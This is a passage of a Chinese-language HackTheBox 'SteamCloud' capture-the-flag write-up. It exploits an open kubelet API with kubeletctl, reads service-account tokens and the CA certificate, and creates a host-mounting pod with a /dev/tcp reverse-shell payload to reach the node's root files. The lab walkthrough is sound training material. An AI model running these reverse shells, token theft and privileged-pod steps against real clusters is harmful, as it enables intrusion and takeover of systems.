+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://github.com/cyberark/kubeletctl<br></code></pre></td></tr></table></figure>
+
+<p>它有很多功能：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Available Commands:<br>  attach        Attach to a container<br>  configz       Return kubelet<span class="hljs-string">&#x27;s configuration.</span><br><span class="hljs-string">  containerLogs Return container log</span><br><span class="hljs-string">  cri           Run commands inside a container through the Container Runtime Interface (CRI)</span><br><span class="hljs-string">  debug         Return debug information (pprof or flags)</span><br><span class="hljs-string">  exec          Run commands inside a container</span><br><span class="hljs-string">  healthz       Check the state of the node</span><br><span class="hljs-string">  help          Help about any command</span><br><span class="hljs-string">  log           Return the log from the node.</span><br><span class="hljs-string">  metrics       Return resource usage metrics (such as container CPU, memory usage, etc.)</span><br><span class="hljs-string">  pods          Get list of pods on the node</span><br><span class="hljs-string">  portForward   Attach to a container</span><br><span class="hljs-string">  run           Run commands inside a container</span><br><span class="hljs-string">  runningpods   Returns all pods running on kubelet from looking at the container runtime cache.</span><br><span class="hljs-string">  scan          Scans for nodes with opened kubelet API</span><br><span class="hljs-string">  spec          Cached MachineInfo returned by cadvisor</span><br><span class="hljs-string">  stats         Return statistical information for the resources in the node.</span><br><span class="hljs-string">  version       Print the version of the kubeletctl</span><br></code></pre></td></tr></table></figure>
+
+<p>我可以尝试访问目标的PODS，它奏效了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl pods -s 10.10.11.133 <br>┌───────────────────────────────────────────────────────────────────────────────────┐<br>│                                 Pods from Kubelet                                 │<br>├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤<br>│   │ POD                                │ NAMESPACE   │ CONTAINERS              │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 1 │ coredns-78fcd69978-qr9j8           │ kube-system │ coredns                 │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 2 │ nginx                              │ default     │ nginx                   │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 4 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 5 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 6 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 7 │ storage-provisioner                │ kube-system │ storage-provisioner     │<br>│   │                                    │             │                         │<br>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤<br>│ 8 │ kube-proxy-4cnt8                   │ kube-system │ kube-proxy              │<br>│   │                                    │             │                         │<br>└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘<br><br></code></pre></td></tr></table></figure>
+
+<p>只有nginx不在kube-system空间中，不知道这是否是作者为我遗留的路径。</p>
+<h4 id="User-txt："><a href="#User-txt：" class="headerlink" title="User.txt："></a>User.txt：</h4><p>在帮助信息中我还看到了exec，或许我可以试着去执行一下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;id&quot;</span> -p nginx -c nginx <br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+<p>它可以，而且还是root，或许我可以试着读取root.txt:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cat /root/root.txt&quot;</span> -p nginx -c nginx<br><span class="hljs-built_in">cat</span>: /root/root.txt: No such file or directory<br><span class="hljs-built_in">command</span> terminated with <span class="hljs-built_in">exit</span> code 1<br></code></pre></td></tr></table></figure>
+
+<p>它告诉我没有文件，哦，root下边是一个user.txt：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;ls /root&quot;</span> -p nginx -c nginx<br>user.txt<br>&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cat /root/user.txt&quot;</span> -p nginx -c nginx<br>cd8bbd...............................<br></code></pre></td></tr></table></figure>
+
+<h4 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt:"></a>root.txt:</h4><p>我尝试反弹bash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;which bash&quot;</span> -p nginx -c nginx<br>/bin/bash<br>&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.4/9001 0&gt;&amp;1&#x27;&quot;</span> -p nginx -c nginx<br>-i: -c: line 0: unexpected EOF <span class="hljs-keyword">while</span> looking <span class="hljs-keyword">for</span> matching `<span class="hljs-string">&#x27;&#x27;</span><br>-i: -c: line 1: syntax error: unexpected end of file<br><span class="hljs-built_in">command</span> terminated with <span class="hljs-built_in">exit</span> code 1<br>&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/9001 0&gt;&amp;1&quot;</span> -p nginx -c nginx <br>bash: &gt;: No such file or directory<br><span class="hljs-built_in">command</span> terminated with <span class="hljs-built_in">exit</span> code 127<br></code></pre></td></tr></table></figure>
+
+<p>我尝试编码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzkwMDEgMD4mMQo=&quot;| base64 -d | bash&quot;&#x27;</span> -p nginx -c nginx<br><span class="hljs-string">&quot;YmFzaCAtaSA JiAvZGV2L3RjcC8xMC4xMC4xNi40LzkwMDEgMD4mMQo=&quot;</span>| <span class="hljs-built_in">base64</span> -d | bash<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>不太行，怎么编的就怎么还回来，似乎它只能执行一些简单的命令，我又在谷歌搜了一堆，我找到了这篇文章：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>labs.f-secure.com<span class="hljs-regexp">/blog/</span>attacking-kubernetes-through-kubelet<br></code></pre></td></tr></table></figure>
+
+<p>它为我讲述了kubernetes如何测试，会有一些敏感目录，例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/run/secrets/kubernetes.io/serviceaccount/token<br></code></pre></td></tr></table></figure>
+
+<p>我可以窃取到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cat /var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span> -p nginx -c nginx<br>eyJhbGciOiJSUzI1NiIsImtpZCI6InNaQkd1a0xEWVNDeHBhSTNXTVE5Yl82SjExZnRtX3JxN3FWTmtGQXMzS28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg0MDY3MzM1LCJpYXQiOjE2NTI1MzEzMzUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImJlODRjNTU0LTg1MDItNGFhZi05OGNhLWQyZTgzNTNjOTNjNSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjYxYjFkMDBkLTMwNmUtNDE4MS04NzdiLWFkNDQxMTk3ZTk1MSJ9LCJ3YXJuYWZ0ZXIiOjE2NTI1MzQ5NDJ9LCJuYmYiOjE2NTI1MzEzMzUsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.F-aIO1xYv8b_6WusHstg43jLPDt_BtYxOvXSH4MZtf71OzjuuKXpN4Dsi8OMQX-IQ_yMyhjTYWhjDZpZ-Lb1bmEJbDbUDM1DqfVvxkmAHp_sGQqxbyqnkM04EvIhcjrKW8I_pQKSkK22NGZYcManSUmJuZLFn12XSKzOp3javgR62St4KCYemXLrd-N-s4wUpUkUCgbabfLkx7TJtSOjM2FRCqkfZo9w5sQ_mXhbKs998EXV-VdWR-iWt1A3hggteiIn4j3LyUxmET9UD1jXU8N6kzYZkrWTdoUCyQSK5jolwCAYdsoCN8QGHYPFxDgTvJRzXz7kNDXXL6D_BCf5Ow <br></code></pre></td></tr></table></figure>
+
+<p>我尝试了解码，但是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6InNaQkd1a0xEWVNDeHBhSTNXTVE5Yl82SjExZnRtX3JxN3FWTmtGQXMzS28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg0MDY3MzM1LCJpYXQiOjE2NTI1MzEzMzUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImJlODRjNTU0LTg1MDItNGFhZi05OGNhLWQyZTgzNTNjOTNjNSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjYxYjFkMDBkLTMwNmUtNDE4MS04NzdiLWFkNDQxMTk3ZTk1MSJ9LCJ3YXJuYWZ0ZXIiOjE2NTI1MzQ5NDJ9LCJuYmYiOjE2NTI1MzEzMzUsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.F-aIO1xYv8b_6WusHstg43jLPDt_BtYxOvXSH4MZtf71OzjuuKXpN4Dsi8OMQX-IQ_yMyhjTYWhjDZpZ-Lb1bmEJbDbUDM1DqfVvxkmAHp_sGQqxbyqnkM04EvIhcjrKW8I_pQKSkK22NGZYcManSUmJuZLFn12XSKzOp3javgR62St4KCYemXLrd-N-s4wUpUkUCgbabfLkx7TJtSOjM2FRCqkfZo9w5sQ_mXhbKs998EXV-VdWR-iWt1A3hggteiIn4j3LyUxmET9UD1jXU8N6kzYZkrWTdoUCyQSK5jolwCAYdsoCN8QGHYPFxDgTvJRzXz7kNDXXL6D_BCf5Ow&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>&#123;<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;RS256&quot;</span>,<span class="hljs-string">&quot;kid&quot;</span>:<span class="hljs-string">&quot;sZBGukLDYSCxpaI3WMQ9b_6J11ftm_rq7qVNkFAs3Ko&quot;</span>&#125;<span class="hljs-built_in">base64</span>: 输入无效<br></code></pre></td></tr></table></figure>
+
+<p>它还有其他敏感目录：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/run/</span>secrets<span class="hljs-regexp">/kubernetes.io/</span>serviceaccount<br><span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/secrets/</span>kubernetes.io/serviceaccount<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;ls /run/secrets/kubernetes.io/serviceaccount&quot;</span> -p nginx -c nginx<br>ca.crt	namespace  token<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;ls /var/run/secrets/kubernetes.io/serviceaccount&quot;</span> -p nginx -c nginx<br>ca.crt	namespace  token<br></code></pre></td></tr></table></figure>
+
+<p>以免复制粘贴错误，可以转存一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubeletcl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cat /run/secrets/kubernetes.io/serviceaccount/ca.crt&quot;</span> -p nginx -c nginx | <span class="hljs-built_in">tee</span> ca.crt                <br>-----BEGIN CERTIFICATE-----<br>MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p<br>a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE<br>AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa<br>YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M<br>HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7<br>deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG<br>VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll<br>hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o<br>1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW<br>MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW<br>BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm<br>lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO<br>DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+<br>9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D<br>xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0<br>JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz<br>kf2eZIBNMp0TFg==<br>-----END CERTIFICATE-----<br></code></pre></td></tr></table></figure>
+
+<p>也可以创建一个变量用来保存token，就像powershell那样：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> token=$(kubeletctl -s 10.10.11.133 <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cat /run/secrets/kubernetes.io/serviceaccount/token&quot;</span> -p nginx -c nginx)<br></code></pre></td></tr></table></figure>
+
+<p>然后可以拿着证书与令牌，对 Kubernetes API 进行身份验证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=<span class="hljs-variable">$token</span> get pod<br>NAME    READY   STATUS    RESTARTS   AGE<br>nginx   1/1     Running   0          164m<br></code></pre></td></tr></table></figure>
+
+<p>看起来可行，这次它没要求我输入账号密码，可是我能做什么呢。在kubectl还有auth can-i命令，可以查看我给定账户有什么权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=<span class="hljs-variable">$token</span><br>Resources                                       Non-Resource URLs                     Resource Names   Verbs<br>selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]<br>selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]<br>pods                                            []                                    []               [get create list]<br>                                                [/.well-known/openid-configuration]   []               [get]<br>                                                [/api/*]                              []               [get]<br>                                                [/api]                                []               [get]<br>                                                [/apis/*]                             []               [get]<br>                                                [/apis]                               []               [get]<br>                                                [/healthz]                            []               [get]<br>                                                [/healthz]                            []               [get]<br>                                                [/livez]                              []               [get]<br>                                                [/livez]                              []               [get]<br>                                                [/openapi/*]                          []               [get]<br>                                                [/openapi]                            []               [get]<br>                                                [/openid/v1/jwks]                     []               [get]<br>                                                [/readyz]                             []               [get]<br>                                                [/readyz]                             []               [get]<br>                                                [/version/]                           []               [get]<br>                                                [/version/]                           []               [get]<br>                                                [/version]                            []               [get]<br>                                                [/version]                            []               [get]<br></code></pre></td></tr></table></figure>
+
+<p>我似乎可以创建文件，我可以拿上边示例文章中的payload试试：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">mosaic-pod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mosaic-pod</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.14.2</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;/bin/bash&quot;</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/9001 0&gt;&amp;1&quot;</span>]<br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">host</span><br>      <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/host</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">host</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>      <span class="hljs-attr">type:</span> <span class="hljs-string">Directory</span><br></code></pre></td></tr></table></figure>
+
+<p>我创建成功了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kubectl --insecure-skip-tls-verify=<span class="hljs-literal">true</span> \<br>          --server=<span class="hljs-string">&quot;https://10.10.11.133:8443&quot;</span> \<br>          --token=<span class="hljs-string">&quot;<span class="hljs-variable">$token</span>&quot;</span> \<br>          create -f shell.yaml<br>pod/mosa-pod created<br></code></pre></td></tr></table></figure>
+
+<p>而我也收到了反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.4] from (UNKNOWN) [10.10.11.133] 55666<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@mosa-pod:/<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>我尝试查找root.txt：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@mosa-pod:/<span class="hljs-comment"># find / -name root.txt</span><br>find: File system loop detected; <span class="hljs-string">&#x27;/host/var/lib/docker/overlay2/74c1cf237c3f1666cfd71a7f54a2263ea73bf931e5fdc8b4db43d76007062980/merged&#x27;</span> is part of the same file system loop as <span class="hljs-string">&#x27;/&#x27;</span>.<br>/host/root/root.txt<br>find: <span class="hljs-string">&#x27;/host/proc/1/map_files&#x27;</span>: Permission denied<br>find: <span class="hljs-string">&#x27;/host/proc/2/map_files&#x27;</span>: Permission denied<br>find: <span class="hljs-string">&#x27;/host/proc/3/map_files&#x27;</span>: Permission denied<br>root@mosa-pod:/<span class="hljs-comment"># cat /host/root/root.txt</span><br>113....................................<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-SteamCloud</div>
+      <div>http://example.com/2022/10/06/HackTheBox-SteamCloud/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Quserier/" title="HackTheBox-Quserier">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Quserier</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Traverxec/" title="HackTheBox-Traverxec">
+                        <span class="hidden-mobile">HackTheBox-Traverxec</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
